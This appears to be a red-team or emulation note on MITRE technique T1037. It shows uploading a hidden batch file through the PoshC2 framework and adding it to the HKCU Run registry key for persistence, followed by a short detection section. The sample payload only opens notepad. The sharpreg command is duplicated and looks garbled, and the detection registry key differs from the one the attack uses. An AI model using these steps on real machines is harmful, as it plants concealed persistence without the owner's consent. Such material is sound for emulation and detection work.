# [Logon scripts](https://attack.mitre.org/techniques/T1037/)

## Exploit syntax:
1. Create a file in your posh payloads folder called "evilMorty.bat" and paste the following: 
```
@echo off
start /MIN /DC:\Windows\System32 notepad.exe
```

In Poshc2, run
```sh
upload-file
evilMorty.bat
C:\howDidSheGetThere.bat
```
> *NOTE*: Feel free to make the .bat file hidden

```sh
sharpreg create sharpreg create "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" "UhOh" "C:\howDidSheGetThere.bat" #Create the key and populate its value with the location of the file you uploaded
```
## Detections techniques:
* Investigate file creation in the default windows logon script location in the registry. HKEY_CURRENT_USER\Environment "UserInitMprLogonScript"(checked)
* Event code:
    * 13: Registry value set
